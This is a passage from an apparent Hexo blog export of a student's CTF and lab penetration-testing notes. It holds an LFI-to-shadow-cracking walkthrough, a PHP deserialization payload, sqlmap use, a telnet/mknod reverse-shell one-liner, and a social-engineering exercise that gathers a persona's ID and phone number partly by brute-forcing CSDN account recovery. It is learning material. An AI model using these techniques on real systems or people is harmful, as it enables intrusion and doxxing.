        <tag>web</tag>
        <tag>misc</tag>
        <tag>reverse</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全</title>
    <url>/2023/02/16/web%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h3 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455944.png" alt="image-20221211231711676"></p>
<p>底部看到有提示，构造get方法cat&#x3D;dog试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455523.png" alt="image-20221211231756648"></p>
<h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a>level1:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455163.png" alt="image-20221211233520721"></p>
<p>源文件提示有个calc.php页面，用get方法传入num来计算，但是有WAF挡着</p>
<p>分别传入数字和字母，发现传字母会被拦截</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456037.png" alt="image-20221211233707884"></p>
<p>参考：[<a href="https://www.cnblogs.com/sfsec/p/15205011.html">RoarCTF 2019]Easy Calc - 随风kali - 博客园 (cnblogs.com)</a></p>
<p>可知在num参数前加空格，可以让WAF检测不到num参数的同时传入num参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456539.png" alt="image-20221211233843529"></p>
<p>那就用php的scandir()函数，列出目录。但黑名单是包含了”&#x2F;“的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456850.png" alt="image-20221211234126984"></p>
<p>就用chr(47)替换</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456540.png" alt="image-20221211234145597"></p>
<p>效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456060.png" alt="image-20221211234208952"></p>
<p>同理，换用file_get_contents()函数显示f1agg内容，由于黑名单没有滤过f,1,a,g字符，所以直接传就可以了，不用换成ascii</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456522.png" alt="image-20221211234546925"></p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h3><p>看源码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456535.png" alt="image-20221212000343880"></p>
<p>要求用post传入password &#x3D;&#x3D; 404但又不能是数字，money &#x3D;&#x3D; 100000000</p>
<p>参考：<a href="https://blog.csdn.net/weixin_50597969/article/details/115492810">php中is_numeric函数的绕过_T0mrvvi1b3t的博客-CSDN博客_is_numeric绕过</a></p>
<p>令password&#x3D;404a</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456925.png" alt="image-20221212001843684"></p>
<p>将GET改POST的时候记得加:Content-Type: application&#x2F;x-www-form-urlencoded</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457037.png" alt="image-20221212001919297"></p>
<p>提示太长了，换用科学计数法</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457799.png" alt="image-20221212002214750"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457132.png" alt="image-20221212002218962"></p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h3><p>还没学会sql注入，暂时不做</p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h3><p>有点像新生杯的EZupload，但更简单</p>
<p>注意到只能传jpg上去，那就用.htaccess绕过，然后上传一句话木马</p>
<p>还没有内容检测，不用变形马</p>
<p>在根目录有现成flag，而且权限足够，不需要在新生杯一样用diasble_function插件绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457008.png" alt="image-20221212011021115"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透-W1R3S</title>
    <url>/2023/02/16/%E6%B8%97%E9%80%8F-W1R3S/</url>
    <content><![CDATA[<p>由于靶机和攻击机我都设置的是nat，处在同一个网关下，所以直接用nmap找一下靶机的ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.11.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849611.png" alt="image-20230104152533315"></p>
<p>猜测是130，再用nmap全扫一下，看看具体的版本信息、开放端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.11.130</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849989.png" alt="image-20230104155143068"></p>
<p>显然，开了四个端口:21,22,80,3306</p>
<p>其中，ftp的21端口可以匿名登陆，里边的文件可能有用；ssh的22端口可以爆破一下用户密码；80端口给的网页，可能有漏洞或者中间件可以攻击；3306数据库可能泄露</p>
<p>先试一下ftp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 192.168.11.130</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849045.png" alt="image-20230104160041435"></p>
<p>把所有文件扒到本地试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849690.png" alt="image-20230104160005641"></p>
<p>好像只有02.txt有点东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849893.png" alt="image-20230104160207387"></p>
<p>但base64解出来啥都不是</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849837.png" alt="image-20230104160236230"></p>
<p>既然ftp走不了，ssh也没啥思路，那就试试web</p>
<p>看到apache2.4.18，想到新生赛的中间件攻击，但是好像没有这个版本的漏洞，只能放弃中间件</p>
<p>dirb扫一下</p>
<p>扫到一堆&#x2F;administrator&#x2F;和&#x2F;wordpress&#x2F;的网址，访问看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849754.png" alt="image-20230104161157828"></p>
<p>是一个cuppa cms框架的安装界面</p>
<p>再找找cuppa cms有没有什么漏洞可以打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849443.png" alt="image-20230104161347544"></p>
<p>只找到一个，复制出来看看具体怎么实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 25971.txt</span><br><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure>

<p>看得到这个漏洞的打法，写的是可以通过这个漏洞读取非php文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849433.png" alt="image-20230104161538221"></p>
<p>参考题目的提示，那就很明显了， 试着读取登陆用户，爆破密码，然后之前找到的ssh就有用了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849441.png" alt="image-20230104164506537"></p>
<p>把target&#x2F;cuppa改成刚刚找到ip&#x2F;administrator&#x2F;的输一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849444.png" alt="image-20230104162153636"></p>
<p>没回显</p>
<p>换用burpsuite发个post试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849447.png" alt="image-20230104164127035"></p>
<p>拿到passwd信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849451.png" alt="image-20230104164144631"></p>
<p>看到有一个特别的用户：w1r3s</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849343.png" alt="image-20230104164639537"></p>
<p>再读一下shadow</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849493.png" alt="image-20230104165656963"></p>
<p>存到pass.txt里，参考<a href="https://blog.csdn.net/weixin_46447549/article/details/121301645">Linux密码破解（使用hydra工具和使用john暴力破解）_国际知名观众的博客-CSDN博客_linux hydra</a></p>
<p>用john爆破</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849950.png" alt="image-20230104170005275"></p>
<p>拿到密码和用户名，再ssh登陆</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181850745.png" alt="image-20230104170238620"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su </span><br></pre></td></tr></table></figure>

<p>成功拿到root权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849287.png" alt="image-20230104170710939"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>考核-渗透</title>
    <url>/2023/02/16/%E8%80%83%E6%A0%B8-%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>先扫网</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.11.1/24</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181831033.png" alt="image-20230124005329665"></p>
<p>靶机是192.168.11.131</p>
<p>扫一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.11.131</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181831748.png" alt="image-20230124005825745"></p>
<p>只开了22和80两个熟悉的端口和5355</p>
<p>访问80</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b1-&gt;<span class="title function_ invoke__">web</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不许反序列化哦&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r1 . <span class="string">&#x27;  --0xfa&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;r1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r1-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome to this game, hope you have a great day&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;c1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>dirsearch爆了一下只有flag.php，那就只能反序列化了</p>
<p>先看一下输入点，在index.php中用post方法传入cmd中</p>
<p>而最后应该利用ctf类中的getFlag函数，echo出flag</p>
<p>1.要调用getFlag，得从pwn类中的__call方法进入</p>
<p>2.要进入pwn中的__call方法，就要通过web类中__invoke()下的$this-&gt;b1-&gt;web()，令$this-&gt;b1&#x3D;new pwn()，使得web()方法成为不可用的方法进入__call中</p>
<p>3.要进入web类中__invoke()，就要把web当成一个函数调用，可以在ctf类中使用execute()函数</p>
<p>4.进入ctf类的execute()函数，可以从misc下的__toString()方法进入</p>
<p>5.要使用__toString()方法，需要从pwn类下__destruct()方法中的字符串拼接实现</p>
<p>所以反序列化链：</p>
<p>unserialize反序列化-&gt;pwn下的__destruct()方法-&gt;misc下的__toString()方法-&gt;ctf下的execute()函数-&gt;绕过web下的__wakeup()方法-&gt;web下的__invoke()方法-&gt;pwn下的__call()方法-&gt;ctf下的getFlag()函数</p>
<p>构造:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new pwn();</span><br><span class="line">$a-&gt;r1=new misc();</span><br><span class="line">$a-&gt;r1-&gt;w=new ctf();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1=new web();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1-&gt;b1=new pwn();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1-&gt;b1-&gt;r1=new ctf();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>得到序列后的值：O:3:”pwn”:1:{s:2:”r1”;O:4:”misc”:1:{s:1:”w”;O:3:”ctf”:1:{s:2:”c1”;O:3:”web”:1:{s:2:”b1”;O:3:”pwn”:1:{s:2:”r1”;O:3:”ctf”:1:{s:2:”c1”;N;}}}}}}</p>
<p>web后的1改为2绕过__wakeup()，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832929.png" alt="image-20230125003958905"></p>
<p>访问：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832523.png" alt="image-20230125004033786"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.11.131/Redr/oCk/Login.php</span><br></pre></td></tr></table></figure>



<p>中间件是apache2.4.18，没找到漏洞利用</p>
<p>dirsearch扫了一下目录，试了一下利用不太到</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832088.png" alt="image-20230125023004286"></p>
<p>在登陆框打’试试能不能sql注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832748.png" alt="image-20230125140418486"></p>
<p>能注入，但没有回显，不方便手注</p>
<p>直接上sqlmap</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832574.png" alt="image-20230125152718588"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832584.png" alt="image-20230125152729262"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832096.png" alt="image-20230125152740313"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832353.png" alt="image-20230125152747414"></p>
<p>有user表，直接看</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832242.png" alt="image-20230125152801893"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832546.png" alt="image-20230125152812017"></p>
<p>拿到账号密码</p>
<p>还有图片上传功能</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832474.png" alt="image-20230125152912999"></p>
<p>尝试之后发现好像没有对后缀进行检测，而是对MIME类型有过滤，但是我按要求传PNG文件仍然报错</p>
<p>（问过学长说不影响做题，那就dirb扫一下有什么目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832181.png" alt="image-20230125200554740"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833024.png" alt="image-20230125200604749"></p>
<p>蚁剑连一下，看看终端权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833831.png" alt="image-20230125200635200"></p>
<p>没权限，看看hint</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833348.png" alt="image-20230125220516581"></p>
<p>反弹个shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机:</span><br><span class="line">mknod a p; telnet 192.168.11.128 2222 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line">攻击机:</span><br><span class="line">netcat -lvvp 2222</span><br></pre></td></tr></table></figure>

<p>或者更自动化一点，用msf</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833636.png" alt="image-20230127144100412"></p>
<p>切换到后台然后找一下漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833328.png" alt="image-20230127145533096"></p>
<p>补全一下playload</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833735.png" alt="image-20230127145629323"></p>
<p>开日</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833308.png" alt="image-20230127145654832"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833957.png" alt="image-20230127145730742"></p>
<p>拿到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834750.png" alt="image-20230127145855166"></p>
<p>下边是手工提权然后失败的过程，还得是脚本小子好当</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833686.png" alt="image-20230126194943121"></p>
<p>试试内核漏洞然后提权</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833506.png" alt="image-20230125222934524"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834940.png" alt="image-20230125222947820"></p>
<p>上面基本都试过了，要不就是编译的时候出问题，要不就是运行的时候就报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834051.png" alt="image-20230126213257249"></p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/weixin_65527369/article/details/127973141">【日常记录】解决‘GLIBC_2.34‘ not found，并且gcc制定glibc版本编译_人间体佐菲的博客-CSDN博客</a></p>
<p>在kali攻击机重新编译之后上传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -Wl,-rpath=&#x27;/var/www/html/Redr/oCk/upload/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64&#x27;,-dynamic-linker=&#x27;/var/www/html/Redr/oCk/upload/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/ld-linux-x86-64.so.2&#x27; -s 40762.c -o 40762 -lkeyutils</span><br></pre></td></tr></table></figure>

<p>执行没回显</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834082.png" alt="image-20230127133929635"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>考核</tag>
      </tags>
  </entry>
  <entry>
    <title>考核-社工</title>
    <url>/2023/02/16/%E8%80%83%E6%A0%B8-%E7%A4%BE%E5%B7%A5/</url>
    <content><![CDATA[<p>qq用base64解码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845662.png" alt="image-20230115021820488"></p>
<p>&#x3D;&#x3D;》<strong>3585956882</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845666.png" alt="image-20230115021918465"></p>
<p>恰个qq，没啥东西，看到是12月12日属羊的，合理猜测一下<strong>出生年月2003.12.12</strong></p>
<p>百度搜一下名字发现这个主页</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845680.png" alt="image-20230115022151325"></p>
<p>在base64解码一下是个ip地址:82.157.233.217</p>
<p>进去主页找到个帖子</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845799.png" alt="image-20230115022855052"></p>
<p>可知<strong>真实姓名拼音缩写为ctz</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845709.png" alt="image-20230115023848828"></p>
<p>图片的exif信息如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845706.png" alt="image-20230115025609631"></p>
<p>查了一下这个地点在海上，屁用没有</p>
<p>有几个信息点：塔像是西安大雁塔；家、塔、饭店一条直线；家离饭店近。</p>
<p>可知，拍摄角度位于大雁塔侧方，所以可以排除几个餐饮点</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845216.png" alt="image-20230115024435523"></p>
<p>西北和东南的小区和饭店隔得太远了，不像是一首真没睡就到得了，大悦城那个方向没有什么住宅区，初步觉得是在8号位置的肯德基，<strong>家住科荣花园小区</strong></p>
<p>进去后台看，提示密码在robots.txt里，打开发现是个压缩包。</p>
<p>博客的其他帖子里发了个密码字典生成器。把已知的信息填进去得到密码字典，再把这个字典用作爆破的，得到密码<strong>CTZ2003.</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845205.png" alt="image-20230115140355486"></p>
<p>进入后台拿到邮箱</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845221.png" alt="image-20230115142251161"></p>
<p><strong><a href="mailto:&#51;&#x35;&#x38;&#53;&#x39;&#53;&#54;&#56;&#56;&#x32;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;">&#51;&#x35;&#x38;&#53;&#x39;&#53;&#54;&#56;&#56;&#x32;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;</a></strong></p>
<p>有一个私密的文章，写的是四级成绩，打开对比一下ctz</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845220.png" alt="image-20230115143016638"></p>
<p><strong>真实姓名陈铁柱</strong></p>
<p><strong>身份证372522200312120019</strong></p>
<p>手机号试试用QQ的找回</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845084.png" alt="image-20230115144420294"></p>
<p>同理，在csdn上边找回一下，发现给出的信息更多</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845622.png" alt="image-20230116014611515"></p>
<p>这下只用猜中间四位了</p>
<p>用burp爆破一下这中间的四位数，由于csdn没啥验证服务，所以爆起来特别容易</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845406.png" alt="image-20230116022527859"></p>
<p>发到intruder里，构造一下payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845240.png" alt="image-20230116022558387"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846464.png" alt="image-20230116022606937"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846054.png" alt="image-20230116022439881"></p>
<p>运气比较好，中间四位不在0001-0999，而且1081离1000很近，csdn没ban我</p>
<p><strong>拿下手机号:15310815980</strong></p>
<p>彩蛋：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846981.png" alt="image-20230116015559155"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846864.png" alt="image-20230116015629824"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>考核</tag>
        <tag>社工</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow愚人杯</title>
    <url>/2023/04/04/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>hint如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042119063.png" alt="image-20230404211906983"></p>
<p>没想到他flag直接就是中文”一个不能说的秘密”，涨见识了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;一个不能说的秘密&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h3><p>下载下来是一个加密的压缩包，按照惯例先试试是不是伪加密</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042122149.png" alt="image-20230404212240131"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042123133.png" alt="image-20230404212308114"></p>
<p>这两个位置都换成00 00，保存打开得到black.png</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042124771.png" alt="image-20230404212400755"></p>
<p>显示了半截，先猜测高度隐写</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042126761.png" alt="image-20230404212648742"></p>
<p>把第二段的96改成等高度384试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042127702.png" alt="image-20230404212730674"></p>
<p>得到全文，但是还是得binwalk看一下有没有藏比</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354105.png" alt="image-20230404235003535"></p>
<p>有藏比，用foremost分离一下得到一个png和zip文件</p>
<p>其实在black.png最后边有提示key，base64之后就是“yurenjie”，这是压缩密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354312.png" alt="image-20230404235153184"></p>
<p>得到flag.png，还是宽度隐写，修改之后就能得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354502.png" alt="image-20230404235248682"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;Th1s_i5_f1ag&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>是个base64编码之后传值到img显示图片</p>
<p>把index.php base64后传进去得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042357547.png" alt="image-20230404235735530"></p>
<p>解码得到内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042358391.png" alt="image-20230404235801368"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;eff420e3-947e-4c4b-816a-ed8810990daf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h3><p>这题解法太多了，能用php原生类做，学长两步就直接做出来了，根本没用到加密函数</p>
<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>我的步骤还是有点繁琐</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># 当前目录中有一个txt文件哦</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;check.php&quot;);</span><br><span class="line"></span><br><span class="line">class EeE&#123;</span><br><span class="line">    public $text;</span><br><span class="line">    public $eeee;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if ($this-&gt;text == &quot;aaaa&quot;)&#123;</span><br><span class="line">            echo lcfirst($this-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function 